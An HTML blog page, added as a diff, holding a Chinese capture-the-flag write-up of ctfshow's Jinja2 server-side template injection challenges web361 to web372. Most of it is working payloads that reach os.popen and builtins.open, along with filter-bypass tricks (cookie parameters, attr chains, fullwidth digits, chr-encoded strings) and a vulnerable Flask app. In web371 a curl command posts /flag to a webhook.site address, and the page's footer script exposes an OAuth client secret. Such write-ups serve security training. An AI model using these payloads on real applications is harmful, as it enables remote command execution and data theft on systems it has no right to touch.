@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>[ctfshow]SSTI | fallingskies</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://fallingskies22.github.io/favicon.ico?v=1724150366542">
+<link rel="stylesheet" href="https://fallingskies22.github.io/styles/main.css">
+
+
+  
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css" />
+  
+
+  
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="参考文章：
+https://xz.aliyun.com/t/3679
+使用工具：
+https://github.com/vladko312/SSTImap
+web361
+python的jinjia2模板注入
+通常使用name={{5*5}}..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://fallingskies22.github.io">
+        <img src="https://fallingskies22.github.io/images/avatar.png?v=1724150366542" class="site-logo">
+        <h1 class="site-title">fallingskies</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="/post/friends" class="site-nav">
+            友链
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      <h3>想要去月球<h3>
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://fallingskies22.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">[ctfshow]SSTI</h2>
+            <div class="post-date">2024-04-29</div>
+            
+              <div class="feature-container" style="background-image: url('https://fallingskies22.github.io/post-images/ctfshowssti.jpg')">
+              </div>
+            
+            <div class="post-content" v-pre>
+              <p>参考文章：<br>
+https://xz.aliyun.com/t/3679</p>
+<p>使用工具：<br>
+https://github.com/vladko312/SSTImap</p>
+<h2 id="web361">web361</h2>
+<p>python的jinjia2模板注入<br>
+通常使用<code>name={{5*5}}</code>的形式测试是否存在SSTI</p>
+<p>先通过&quot;&quot;.<strong>class</strong>.<strong>mro</strong>[1]获取到object类<br>
+再通过__subclasses__()[132]获取到&lt;class 'os._wrap_close'&gt;<br>
+init初始化os类，然后globals全局来查找所有的方法及变量及参数。<br>
+调用popen方法来执行命令。</p>
+<p>payload</p>
+<pre><code>?name={{&quot;&quot;.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[%27popen%27](&quot;env&quot;).read()}}
+</code></pre>
+<h2 id="web362">web362</h2>
+<p>过滤了数字2和3<br>
+app.py</p>
+<pre><code class="language-python">from flask import Flask 
+from flask import request 
+from flask import render_template_string 
+import re 
+
+app = Flask(__name__) 
+
+@app.route('/') 
+def app_index(): 
+	name = request.args.get('name') 
+
+	if name: 
+		if re.search(r&quot;2|3&quot;,name,re.I): 
+			return ':(' template = ''' {%% block body %%} &lt;div class=&quot;center-content error&quot;&gt; &lt;h1&gt;Hello&lt;/h1&gt; &lt;h3&gt;%s&lt;/h3&gt; &lt;/div&gt; {%% endblock %%} ''' % (request.args.get('name')) 
+
+	return render_template_string(template) 
+
+if __name__==&quot;__main__&quot;: 
+	app.run(host='0.0.0.0',port=80)
+</code></pre>
+<p>可以使用数字运算来绕过</p>
+<pre><code>?name={{&quot;&quot;.__class__.__mro__[1].__subclasses__()[140-8].__init__.__globals__[%27popen%27](&quot;env&quot;).read()}}
+</code></pre>
+<h2 id="web363">web363</h2>
+<p>过滤了单双引号，使用GET传参的方式绕过。</p>
+<pre><code>?name={{().__class__.__base__.__subclasses__()[132].__init__.__globals__[request.args.a](request.args.b).read()}}&amp;a=popen&amp;b=env
+</code></pre>
+<h2 id="web364">web364</h2>
+<p>过滤了单双引号，以及args</p>
+<p>使用cookie传参的方式绕过</p>
+<pre><code>/?name={{().__class__.__base__.__subclasses__()[132].__init__.__globals__[request.cookies.a](request.cookies.b).read()}}
+Cookie:a=popen;b=env
+</code></pre>
+<h2 id="web365">web365</h2>
+<p>又过滤了中括号<br>
+使用getitem函数绕过</p>
+<pre><code>/?name={{().__class__.__base__.__subclasses__().__getitem__(132).__init__.__globals__.__getitem__(request.cookies.a)(request.cookies.b).read()}}
+Cookie:a=popen;b=env
+</code></pre>
+<h2 id="web366">web366</h2>
+<p>又过滤了下划线<br>
+使用attr函数绕过</p>
+<pre><code>/?name={{(()|attr(request.cookies.a)|attr(request.cookies.b)|attr(request.cookies.c)()|attr(request.cookies.d)(132)|attr(request.cookies.e)|attr(request.cookies.f)|attr(request.cookies.g)(request.cookies.h)(request.cookies.i)).read()}}
+
+Cookie: a=__class__;b=__base__;c=__subclasses__;d=__getitem__;e=__init__;f=__globals__;g=__getitem__;h=popen;i=env
+</code></pre>
+<h2 id="web367">web367</h2>
+<p>又过滤了<code>os</code>字符，上题payload依然可以。</p>
+<h2 id="web368">web368</h2>
+<p>又过滤了<code>{{</code>，使用<code>{%</code>来绕过</p>
+<pre><code>/?name={%print(()|attr(request.cookies.a)|attr(request.cookies.b)|attr(request.cookies.c)()|attr(request.cookies.d)(132)|attr(request.cookies.e)|attr(request.cookies.f)|attr(request.cookies.g)(request.cookies.h)(request.cookies.i)).read()%} 
+
+Cookie: a=__class__;b=__base__;c=__subclasses__;d=__getitem__;e=__init__;f=__globals__;g=__getitem__;h=popen;i=env
+</code></pre>
+<h2 id="web369">web369</h2>
+<p>查看引擎相关资料：https://jinja.palletsprojects.com/en/3.1.x/templates/#builtin-filters</p>
+<p>又过滤了<code>request</code>字符<br>
+需要构造字符</p>
+<p>使用select方法构造出<code>_</code><br>
+<img src="https://fallingskies22.github.io/post-images/1716131250598.png" alt="" loading="lazy"></p>
+<pre><code>{% set a=(()|select|string|list).pop(24) %}    // a = _
+</code></pre>
+<p>payload</p>
+<pre><code>?name=
+{% set a=(()|select|string|list).pop(24) %}
+{% set init=(a,a,dict(init=a)|join,a,a)|join()%}
+{% set globals=(a,a,dict(globals=a)|join,a,a)|join()%}
+{% set getitem=(a,a,dict(getitem=a)|join,a,a)|join()%}
+{% set builtins=(a,a,dict(builtins=a)|join,a,a)|join()%}
+{% set x=(q|attr(init)|attr(globals)|attr(getitem))(builtins)%}
+{% set chr=x.chr%}
+{% set file=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%}
+{%print(x.open(file).read())%}
+</code></pre>
+<p>使用dict函数，绕过双引号过滤。<br>
+从__builtins__中直接获取chr函数和open函数。</p>
+<h2 id="web370">web370</h2>
+<p>过滤了所有数字</p>
+<p>将数字转化成全角数字来绕过</p>
+<p>py脚本</p>
+<pre><code class="language-python">def half2full(half):
+    full = ''
+    for ch in half:
+        if ord(ch) in range(33, 127):
+            ch = chr(ord(ch) + 0xfee0)
+        elif ord(ch) == 32:
+            ch = chr(0x3000)
+        else:
+            pass
+        full += ch
+    return full
+    
+while 1:
+    t = ''
+    s = input(&quot;输入想要转换的数字字符串：&quot;)
+    for i in s:
+        t += half2full(i)
+    print(t)
+</code></pre>
+<p>payload</p>
+<pre><code>?name=
+{% set a=(()|select|string|list).pop(２４) %}
+{% set init=(a,a,dict(init=a)|join,a,a)|join()%}
+{% set globals=(a,a,dict(globals=a)|join,a,a)|join()%}
+{% set getitem=(a,a,dict(getitem=a)|join,a,a)|join()%}
+{% set builtins=(a,a,dict(builtins=a)|join,a,a)|join()%}
+{% set x=(q|attr(init)|attr(globals)|attr(getitem))(builtins)%}
+{% set chr=x.chr%}
+{% set file=chr(４７)%2bchr(１０２)%2bchr(１０８)%2bchr(９７)%2bchr(１０３)%}
+{%print(x.open(file).read())%}
+</code></pre>
+<h2 id="web371">web371</h2>
+<p>过滤了print，使用curl带外来绕过</p>
+<pre><code class="language-sh">curl -X POST -F xx=@/flag https://webhook.site/c56530ad-bbfc-45d1-bb42-510a63cd0b88
+</code></pre>
+<p>chr转换脚本</p>
+<pre><code class="language-python">def half2full(half):
+    full = ''
+    for ch in half:
+        if ord(ch) in range(33, 127):
+            ch = chr(ord(ch) + 0xfee0)
+        elif ord(ch) == 32:
+            ch = chr(0x3000)
+        else:
+            pass
+        full += ch
+    return full
+string = input(&quot;input: &quot;)
+result = ''
+def str2chr(s):
+    global  result
+    for i in s:
+        result += &quot;chr(&quot;+half2full(str(ord(i)))+&quot;)%2b&quot;
+str2chr(string)
+print(result[:-3])
+</code></pre>
+<p>注意复制这段时不要有空格，这里用vscode输出，复制时将换行识别为空格夹在数字中间，害我调试了半天。</p>
+<p>payload</p>
+<pre><code>?name=
+{% set a=(()|select|string|list).pop(２４) %}
+{% set init=(a,a,dict(init=a)|join,a,a)|join()%}
+{% set globals=(a,a,dict(globals=a)|join,a,a)|join()%}
+{% set getitem=(a,a,dict(getitem=a)|join,a,a)|join()%}
+{% set builtins=(a,a,dict(builtins=a)|join,a,a)|join()%}
+{% set oas=(dict(o=a,s=a)|join)%}
+{% set x=(q|attr(init)|attr(globals)|attr(getitem))(builtins)%}
+{% set chr=x.chr%}
+{% set cmd=chr(９９)%2bchr(１１７)%2bchr(１１４)%2bchr(１０８)%2bchr(３２)%2bchr(４５)%2bchr(８８)%2bchr(３２)%2bchr(８０)%2bchr(７９)%2bchr(８３)%2bchr(８４)%2bchr(３２)%2bchr(４５)%2bchr(７０)%2bchr(３２)%2bchr(１２０)%2bchr(１２０)%2bchr(６１)%2bchr(６４)%2bchr(４７)%2bchr(１０２)%2bchr(１０８)%2bchr(９７)%2bchr(１０３)%2bchr(３２)%2bchr(１０４)%2bchr(１１６)%2bchr(１１６)%2bchr(１１２)%2bchr(５８)%2bchr(４７)%2bchr(４７)%2bchr(１１９)%2bchr(１０１)%2bchr(９８)%2bchr(１０４)%2bchr(１１１)%2bchr(１１１)%2bchr(１０７)%2bchr(４６)%2bchr(１１５)%2bchr(１０５)%2bchr(１１６)%2bchr(１０１)%2bchr(４７)%2bchr(９９)%2bchr(５３)%2bchr(５４)%2bchr(５３)%2bchr(５１)%2bchr(４８)%2bchr(９７)%2bchr(１００)%2bchr(４５)%2bchr(９８)%2bchr(９８)%2bchr(１０２)%2bchr(９９)%2bchr(４５)%2bchr(５２)%2bchr(５３)%2bchr(１００)%2bchr(４９)%2bchr(４５)%2bchr(９８)%2bchr(９８)%2bchr(５２)%2bchr(５０)%2bchr(４５)%2bchr(５３)%2bchr(４９)%2bchr(４８)%2bchr(９７)%2bchr(５４)%2bchr(５１)%2bchr(９９)%2bchr(１００)%2bchr(４８)%2bchr(９８)%2bchr(５６)%2bchr(５６)%}
+{% if ((lipsum|attr(globals)).get(oas).popen(cmd))%}
+success
+{% endif %}
+</code></pre>
+<h2 id="web372">web372</h2>
+<p>过滤了count，预期解是用lenth代替count，但我们用全角数字绕过，所以上题payload依然可以使用。</p>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://fallingskies22.github.io/post/ctfshowphpcve/">
+                  <h3 class="post-title">
+                    [ctfshow]phpCVE
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+              
+                <div id="gitalk-container" data-aos="fade-in"></div>
+              
+
+              
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+  
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+
+      var gitalk = new Gitalk({
+        clientID: '1b08861b8ad19018640e',
+        clientSecret: '1881a7245597aa70e1ffc8412e5b6c1eb0ad7241',
+        repo: 'fallingskies22.github.io',
+        owner: 'fallingskies22',
+        admin: ['fallingskies22'],
+        id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+        distractionFreeMode: false  // Facebook-like distraction free mode
+      })
+
+      gitalk.render('gitalk-container')
+
+    </script>
+  
+
+  
+
+
+
+
+  </body>
+</html>
